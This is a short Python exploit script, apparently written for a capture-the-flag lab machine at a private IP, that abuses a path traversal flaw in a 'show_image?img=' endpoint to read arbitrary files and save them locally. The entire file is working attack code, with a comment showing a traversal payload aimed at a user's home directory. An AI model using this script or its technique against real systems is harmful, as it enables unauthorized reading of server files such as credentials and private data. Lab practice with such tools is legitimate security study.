import requests
import sys
import os

if len(sys.argv) != 2:
    print("[usage] python3 enumLFI.py <path>")
    exit(1)


# http://10.129.184.102:8080/show_image?img=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome..%2Ffrank
path = sys.argv[1]
endpoint=f"http://10.129.184.102:8080/show_image?img=../../../../../../..{path}"
endpoint.replace('/', '%2F')
print(endpoint)
r = requests.get(endpoint)

if r.status_code == 200:
    raw = r.text

    os.makedirs(os.path.dirname(f"./recovered/{path}"), exist_ok=True)
    with open(f"./recovered/{path}", "w") as f:
        f.write(raw)
    
    print(raw)
